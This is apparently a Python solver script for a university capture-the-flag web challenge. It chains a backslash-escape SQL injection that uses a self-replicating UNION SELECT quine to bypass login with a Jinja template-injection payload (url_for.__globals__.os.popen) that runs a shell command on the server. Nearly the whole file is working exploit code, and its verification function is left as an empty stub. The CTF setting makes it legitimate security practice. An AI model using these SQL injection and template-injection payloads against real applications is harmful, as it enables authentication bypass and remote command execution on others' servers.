
import requests
import binascii

URL = "https://no-quotes-2-646768e955f25c7f.chals.uoftctf.org/login?cmd=/readflag"
HOME = "https://no-quotes-2-646768e955f25c7f.chals.uoftctf.org/home?cmd=/readflag"

def ascii_to_hex(text):
    return binascii.hexlify(text.encode('utf-8')).decode('utf-8')

def generate_payload(ssti_payload):
    # Target Username: ssti_payload + "\"
    # The backslash escapes the quote in the SQL query.
    username_target = ssti_payload + "\\"
    username_hex = ascii_to_hex(username_target)
    
    # Template T
    # P = T.replace('$', '0x' + hex(T))
    # We want P to be executed and return P.
    # P executed returns: REPLACE( T with $ -> '0x'+hex(T) )
    # Which is exactly P.
    
    # Note: We use 0x3078 for "0x"
    # hex() in Python is lowercase, MySQL HEX() is uppercase.
    # We must ensure we construct P with UPPERCASE hex so it matches what MySQL returns.
    
    prefix = f") UNION SELECT 0x{username_hex}, REPLACE("
    # The suffix includes the rest of the query. 
    # We replace $ with the hex string.
    # Code: REPLACE($, CHAR(36), CONCAT(0x3078, HEX($)))
    suffix = ", CHAR(36), CONCAT(0x3078, HEX($))) #"
    
    T = prefix + "$" + suffix
    
    # Calculate Hex of T (Uppercase) to match MySQL behavior
    T_hex = ascii_to_hex(T).upper()
    
    # The replacement string is "0x" + T_hex
    replacement = "0x" + T_hex
    
    # Payload
    payload = T.replace("$", replacement)
    
    return username_target, payload

def simulate_mysql_hex(s):
    # MySQL HEX() returns uppercase hex
    return binascii.hexlify(s.encode('utf-8')).decode('utf-8').upper()

def simulate_mysql_replace(s, search, replace):
    return s.replace(search, replace)

def verify_quine(username_target, payload):
    # Simulate DB execution
    # Query: UNION SELECT 0xUserHex, REPLACE(0xT, 36, CONCAT(0x3078, HEX(0xT))) #
    # returns row[0] = Decode(0xUserHex)
    # returns row[1] = REPLACE(T, '$', "0x" + HEX(T))
    
    # We must extract T and UserHex from payload to verify?
    # Actually we generated payload from T. 
    # Let's verify if our logic holds.
    
    # Reconstruct T from payload? 
    # Payload is T.replace("$", replacement).
    # We can just use the generation logic to verified consistency.
    pass


def exploit():
    # Payload to read flag
    # We use url_for to access globals -> os -> popen
    # We use request.args.cmd to avoid quotes in the payload.
    ssti = "{{ url_for.__globals__.os.popen(request.args.cmd).read() }}"
    
    print("[*] Generating payload...")
    username, password = generate_payload(ssti)
    
    # Verification
    # T was: prefix + "$" + suffix
    # P = T.replace("$", "0x" + HEX(T))
    # Row[1] should be: T.replace("$", "0x" + HEX(T)) (simulated)
    # So Row[1] == P.
    # This is mathematically true by construction.
    # Unless encoding fails.
    
    print(f"[*] Username Payload: {username}")
    print(f"[*] Password Payload: {password}") # It's very long
    
    s = requests.Session()
    data = {
        "username": username,
        "password": password
    }
    
    print("[*] Sending request...")
    r = s.post(URL, data=data)
    
    print(f"[*] Login Response: {r.status_code}")
    if "Invalid credentials" in r.text and "No quotes allowed" not in r.text:
        print("[-] Login Failed: Invalid credentials mismatch.")
        print("    This likely means the Quine didn't match row[1] or username didn't match row[0].")
    elif "No quotes allowed" in r.text:
        print("[-] Login Failed: WAF triggered")
    else:
        # Check if we got redirected or just session set
        if r.history or r.url == HOME:
             print("[+] Redirect detected.")
        
        # Access home
        r2 = s.get(HOME)
        if "uoftctf{" in r2.text:
            print("[+] Flag found in Home Page!")
            # Extract flag likely
            print(r2.text)
        else:
            print("[+] Home Page accessed but flag not obvious? Checking content:")
            print(r2.text)

if __name__ == "__main__":
    exploit()
